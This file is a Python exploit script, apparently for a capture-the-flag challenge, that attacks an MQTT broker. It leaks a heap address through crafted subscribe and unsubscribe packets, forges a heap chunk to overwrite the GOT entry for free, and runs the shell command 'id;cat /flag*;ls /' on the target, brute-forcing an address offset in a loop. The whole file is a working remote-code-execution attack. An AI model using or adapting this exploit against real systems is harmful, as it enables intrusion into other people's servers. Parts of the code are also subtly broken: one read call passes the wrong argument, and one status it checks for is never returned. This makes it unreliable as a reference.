import socket, struct, time, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2])
START=int(sys.argv[3],16); END=int(sys.argv[4],16); STEP=int(sys.argv[5],16)
MODE=(sys.argv[6] if len(sys.argv)>6 else 'rel')
CMD=b'id;cat /flag*;ls / #'
CMD=CMD+b' '*((32-len(CMD))%32 or 0)
BIN2HEAP=0x220f0; TABLE=0x20338; GOT_FREE=0x20220
GAP=0.15
def vi(n):
    o=b''
    while True:
        b=n%128;n//=128
        if n:o+=bytes([b|0x80])
        else:o+=bytes([b]);break
    return o
def ss(x):
    if isinstance(x,str): x=x.encode()
    return struct.pack('>H',len(x)&0xffff)+x
def pk(t,b): return bytes([t])+vi(len(b))+b
def subp(topic=None,raw=None,pl=None):
    body=struct.pack('>H',1)+(ss(topic) if raw is None else struct.pack('>H',raw)+pl)
    return pk(0x82,body)
def unsubp(topic): return pk(0xA2,struct.pack('>H',1)+ss(topic))
def pubp(topic,payload): return pk(0x30,ss(topic)+payload)
def rd(s,t=1.5):
    s.settimeout(t); out=b''
    try:
        while True:
            d=s.recv(65536)
            if not d: break
            out+=d
    except Exception: pass
    return out
def attempt(delta):
    try: s=socket.create_connection((HOST,PORT),6)
    except Exception: return 'CONN',b''
    try:
        s.sendall(pk(0x10,ss('MQTT')+bytes([4,0xC2])+struct.pack('>H',0x4321)+ss('QWB_Client')+ss('QWB2026_Admin')+ss('hn5ne')))
        time.sleep(0.45); rd(s,0.6)
        for p in [subp('d1zz'),subp('d2zz'),subp('d3zz'),subp(b'A'*30),subp(b'B'*30),subp('QWB2026_News'),
                  unsubp(b'A'*30),unsubp(b'B'*30)]+[b'\xc0\x00']*6+[pubp('QWB2026_News',b'C'*30)]:
            s.sendall(p); time.sleep(GAP)
        time.sleep(0.8); r=rd(s,1.2)
        i=r.find(b'\x34\x2e\x00\x0cQWB2026_News'); leak=None
        if i>=0:
            bd=r[i+2:i+2+0x2e]; tl=struct.unpack('>H',bd[0:2])[0]; leak=struct.unpack('>Q',bd[2+tl+2:][:8])[0]
        if not leak: s.close(); return 'LEAK',b''
        BASE=leak-BIN2HEAP
        LOW24 = (delta & 0xffffff) if MODE=='abs' else (BASE+delta+0x65370)&0xffffff
        pl=bytearray(b'A'*272); pl[24:32]=struct.pack('>Q',0x21); pl[32:40]=struct.pack('>Q',(BASE+TABLE)-16)
        slot=bytearray(272)
        slot[0:8]=struct.pack('>Q',BASE+0x22130)
        slot[8:10]=struct.pack('>H',len(CMD))
        slot[16:24]=struct.pack('>Q',BASE+GOT_FREE+5)
        slot[24:26]=struct.pack('>H',3)
        seq=[subp(CMD),subp('/bin/sh'),subp('d1xx'),subp('d2xx'),subp('Xx'),subp('Yy'),subp('Z'*400),
             unsubp('Yy'),unsubp('Xx'),subp(raw=0xFFFF,pl=bytes(pl)),subp('AAAA'),
             subp(raw=0xFFFF,pl=bytes(slot)),pubp(CMD,struct.pack('>I',LOW24)[1:]),
             unsubp(CMD)]
        for p in seq:
            s.sendall(p); time.sleep(GAP)
        time.sleep(1.5); out=rd(2.0); s.close()
        if b'uid=' in out or b'flag' in out or b'root' in out: return 'HIT',out
        if out==b'' or out==b'\xb0\x02\x00\x01': return 'miss',out
        return 'crash',out
    except Exception:
        try: s.close()
        except Exception: pass
        return 'ERR',b''
d=START; n=0; t0=time.time()
while d<=END:
    r,out=attempt(d); n+=1
    if r=='HIT':
        print('*** HIT delta=%#x %s'%(d,out[:300]), flush=True); break
    if r=='odd' or n%8==0:
        print('%#x %s [%d/%d %ds]'%(d,r,n,(END-START)//STEP+1,int(time.time()-t0)), flush=True)
    d+=STEP
print('done', flush=True)
